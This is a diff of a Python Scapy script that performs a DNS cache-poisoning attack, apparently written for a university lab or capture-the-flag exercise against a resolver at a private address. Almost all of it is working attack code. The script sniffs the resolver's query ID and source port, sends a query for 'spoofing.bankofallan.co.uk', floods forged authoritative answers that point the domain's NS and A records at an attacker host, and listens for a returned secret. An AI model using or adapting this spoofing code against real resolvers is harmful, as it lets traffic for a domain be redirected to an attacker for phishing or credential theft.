@@ -1,20 +1,19 @@
 from scapy.layers.dns import *
 from scapy.all import *
-#from dnslib import *
 from threading import Thread
 import time
 
 DNS_SPOOF_IP = "10.0.0.1"
 VULN_DNS_IP = "192.168.56.101"
-VULN_DNS_DPORT = 55553
+BAD_DNS_IP = "192.168.56.1"
 FAKE_REQUEST = "spoofing.bankofallan.co.uk"
 FAKE_DOMAIN = "bankofallan.co.uk"
-BAD_DNS_IP = "192.168.56.1"
+CONFIG_DNS_PORT = 55553
 
-Q_ID = 0                # query ID globale
-PORT_NUMBER = 0         # porta da catturare
-GOAL = 0                # va a 1 se riesco nell'attacco
-N_TRY = 1               # tentativi provati
+Q_ID = 0                # query ID
+PORT_NUMBER = 0         # port to catch
+GOAL = 0                # Victory
+N_TRY = 1
 PACKETS = []
 
 class FirstThread(Thread):
@@ -24,17 +23,19 @@ class FirstThread(Thread):
                 self.job = job
 
         def run(self):
-                if self.job == 0:                                                       # sniffer
+                if self.job == 0:                                                                                       # sniffing port and ID
                         sniffer_job()
 
+                '''
                 if self.job == 1:                                                       # sender per badguy
                         sender_job()
+                '''
 
-                if self.job == 4:                                                       # in ascolto per il secret
+                if self.job == 1:                                                                                       # listening the secret
                         secret_job()
 
 
-
+"""
 def sender_job():
         '''
         invio la prima query DNS per badguy.ru
@@ -42,18 +43,19 @@ def sender_job():
         '''
         time.sleep(1)                                                                 # attendo che parta lo sniffer
         send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
+"""
 
 def sniffer_job():
         '''
-        sniffo la query ricorsiva fatta all'host per badguy.ru
-        catturo query ID e numero di porta
+        sniff the recursive query for badguy.ru
+        catch query ID and port number
         :return:
         '''
         global Q_ID
         global PORT_NUMBER
         global GOAL
 
-        raw = sniff(count=1, timeout=1, filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port " + str(VULN_DNS_DPORT))
+        raw = sniff(count=1, timeout=1, filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port " + str(CONFIG_DNS_PORT))
         if GOAL == 0:
                 raw_pkt = str(raw[0].getlayer(Raw))
                 dns = DNS(raw_pkt)
@@ -62,13 +64,13 @@ def sniffer_job():
 
 def secret_job():
         '''
-        attende il secret e aggiorna GOAL
+        wait for secret and update GOAL
         :return:
         '''
         global GOAL
         scrt_pkt = sniff(count=1, filter= "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337")
-        scrt_pkt[0].show()
         GOAL = 1
+        scrt_pkt[0].show()
 
 def master_job():
         '''
@@ -82,16 +84,21 @@ def master_job():
         global N_TRY
         global PACKETS
 
-        listener_thread = FirstThread(name="listener", job=4)
+        listener_thread = FirstThread(name="listener", job=1)                                                           # init listener
         listener_thread.start()
 
         while GOAL == 0:
-                sniffer_thread = FirstThread(name="sniffer", job=0)
+                sniffer_thread = FirstThread(name="sniffer", job=0)                                                     # init sniffer
                 sniffer_thread.start()
 
-                sender_thread = FirstThread(name="sender", job=1)
+                '''sender_thread = FirstThread(name="sender", job=1)
                 sender_thread.start()
-                sender_thread.join()
+                sender_thread.join()'''
+
+                #sender_job()
+
+                time.sleep(1)                                                                                           # waiting for the sniffer
+                send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))                              # badguy query
 
                 if Q_ID == 0 or PORT_NUMBER == 0:
                         sniffer_thread.join()
@@ -99,32 +106,32 @@ def master_job():
 
                 print ('\n\n\nTry # ' + str(N_TRY) +'\n[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))
 
-                for index in range(1, 900):
+
+                # TODO N.B: sul mio pc il DNS impiega 1 ms per un dig, in 1 ms l'host riesce a mandare circa 150 pacchetti
+                for index in range(1, 200):                                                                             # building fake packets
                         pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                               DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                                   qdcount=1, ancount=0,
                                   nscount=1, arcount=1,
                                   qd=(DNSQR(qname=FAKE_REQUEST, qtype='A', qclass='IN')),
                                   an=None,
-                                  ns=(DNSRR(rrname=FAKE_DOMAIN, type='NS', rclass='IN', ttl=60000, rdlen=24,
+                                  ns=(DNSRR(rrname=FAKE_DOMAIN, type='NS', rclass='IN', ttl=60000,
                                             rdata=FAKE_REQUEST)),
-                                  ar=(DNSRR(rrname=FAKE_REQUEST, type='A', rclass='IN', ttl=60000, rdlen=4,
+                                  ar=(DNSRR(rrname=FAKE_REQUEST, type='A', rclass='IN', ttl=60000,
                                             rdata=BAD_DNS_IP)))
                         PACKETS.append(bytes(pkt))
 
-                # richiesta
+                # fake request
                 query_sock.sendto((bytes(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname=FAKE_REQUEST)))), (VULN_DNS_IP, PORT_NUMBER))
 
                 for pkt in PACKETS:
-                        # flooding
-                        flood_sock.sendto(pkt, (VULN_DNS_IP, PORT_NUMBER))
+                        flood_sock.sendto(pkt, (VULN_DNS_IP, PORT_NUMBER))                                              # sending fake packets
 
-                PORT_NUMBER = 0
+                PORT_NUMBER = 0                                                                                         # reset for next cycle
                 Q_ID = 0
                 N_TRY = N_TRY + 1
                 PACKETS = []
 
-        # GOAL viene visto al ciclo successivo se il listener e' lento
         listener_thread.join()
         print "Goal reached.\nEND"
 
